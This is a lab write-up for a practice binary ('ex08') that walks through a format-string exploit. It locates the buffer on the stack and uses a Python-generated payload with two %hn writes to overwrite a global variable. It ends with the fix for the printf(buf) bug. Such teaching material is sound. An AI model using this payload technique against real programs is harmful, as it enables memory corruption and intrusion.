# ex08 — Format-string write of a large target (`%hn` split)

Goal: `you have modified the target :)`

## Assembly

```
printbuffer:
    mov    eax, [ebp+8]           ; the buf pointer
    mov    [esp], eax
    call   printf                 ; printf(buf)  <-- VULN

vuln:
    sub    esp, 0x218
    lea    eax, [ebp-0x208]       ; &buf
    ; fgets(buf, 0x200, stdin)
    call   fgets
    lea    eax, [ebp-0x208]
    mov    [esp], eax
    call   printbuffer
    mov    eax, ds:0x80496f4      ; target
    cmp    eax, 0x1025544
    jne    .lose
    puts("you have modified the target :)")
```

`target` (`.bss`, `0x080496f4`) must equal **`0x01025544`**.

## Stack layout at the `printf` call inside `printbuffer`

Because `printf` is called from inside a wrapper function, our buffer no
longer lives right next to `printf`'s variadic slots. Probing with an
`AAAA` marker + numbered `%N$x` locates it:

```
$ printf 'AAAA-|%1$x|%2$x|…|%12$x' → 12th slot is 41414141
```

So `%12$` addresses `buf[0..3]`, `%13$` addresses `buf[4..7]`.

## Exploit — two `%hn` writes

`0x01025544` is far too large to print in one shot with `%Nx`. Split into
two 16-bit halves and use `%hn` (writes 2 bytes) at two consecutive
addresses:

| slot | address       | value   |
|------|---------------|---------|
| lo   | `0x080496f4`  | `0x5544` |
| hi   | `0x080496f6`  | `0x0102` |

The two `%hn` writes have to be ordered smallest → largest byte count.
`0x0102 < 0x5544`, so write the **high** half first.

Bytes already printed after the two 4-byte addresses = 8.
- To reach `0x0102` (258): print `258 − 8 = 250` filler → `%250x`, then `%12$hn`
- To reach `0x5544` (21828): print `21828 − 258 = 21570` more → `%21570x`, then `%13$hn`

```bash
python3 -c "
import sys, struct
p  = struct.pack('<I', 0x080496f6)   # slot 12 → high half
p += struct.pack('<I', 0x080496f4)   # slot 13 → low half
p += b'%250x%12\$hn%21570x%13\$hn\n'
sys.stdout.buffer.write(p)
" | ./ex08/bin | tail -1
```

Output:
```
you have modified the target :)
```

## Fix

Same as ex07: the bug is `printf(buf)`. Use `printf("%s", buf)` (or
`fputs`) and enable `-Wformat -Wformat-security`. Wrapping the call inside
a helper function doesn't change the vulnerability — the format string is
still user input.
